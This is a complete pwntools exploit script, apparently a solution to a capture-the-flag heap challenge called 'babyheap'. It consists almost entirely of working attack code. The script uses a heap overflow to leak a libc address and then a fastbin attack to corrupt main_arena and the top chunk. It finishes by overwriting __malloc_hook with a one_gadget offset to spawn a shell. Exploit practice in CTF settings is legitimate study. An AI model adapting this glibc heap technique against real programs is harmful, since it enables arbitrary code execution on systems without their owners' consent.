from pwn import *

context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
p = process('./babyheap')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def new(size):
    p.recvuntil('Command: ')
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))

def dele(index):
    p.recvuntil('Command: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(index))

def update(index,size,context):
    p.recvuntil('Command: ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Content: ')
    p.sendline(context)

def view(index):
    p.recvuntil('Command: ')
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(index))

#---leak libc
new(0x18)#0
new(0x18)#1
new(0x40)#2 #40
new(0x20)#3 #90
new(0x40)#4 #c0
update(0,0x19,0x19*'\x61')
update(1,0x10,p64(0)+p64(0x91))
update(2,0x40,8*p64(0x91))
dele(1)#1
new(0x50)#1 20
update(1,0x30,6*p64(0x91))
update(4,0x40,4*(p64(0x0) + p64(0x21)))
dele(2)#2  40
view(1)
p.recv(0x2a)#2a
a = p.recv(8)
main_ar = u64(a)
success(hex(u64(a)))
libcc = u64(a) - 0x3c4b78
success(hex(libcc))

#--calloc unsortbin
new(0x30)#2 40 
new(0x40)#5 90
#--free to fastbins
update(5,0x10,2*(p64(0)+p64(0x31)))
update(1,0x50,10*(p64(0)+p64(0x51)))
dele(2)#2

#--change mainarena 
des_addr = main_ar - 0x40
a = p64(0) + p64(0x51) + p64(0) + p64(0x51) + p64(0x41) + p64(51)
update(1,len(a),a)
new(0x40)#2 40

#--fastbin attack 
new(0x18)#6  
new(0x18)#7 130
new(0x30)#8 150
update(6,0x19,0x19*'\x41')
update(8,0x30,6*(p64(0)+ p64(0x21)))
dele(7)
new(0x30)#7 130
b= p64(0)+p64(0) + p64(0) + p64(0x41) + p64(des_addr)+p64(0)
update(7,len(b),b)
dele(8)
update(7,len(b),b)

#--change topchunk
new(0x30)#8
new(0x38)#9
payload = p64(0)*6 + p64(des_addr-56)
update(9,len(payload),payload)
#--change mallloc hook
new(0x18)#10
payload2 = libcc + 0x4526a
update(10,len(p64(payload2)),p64(payload2))
new(1)

p.interactive()
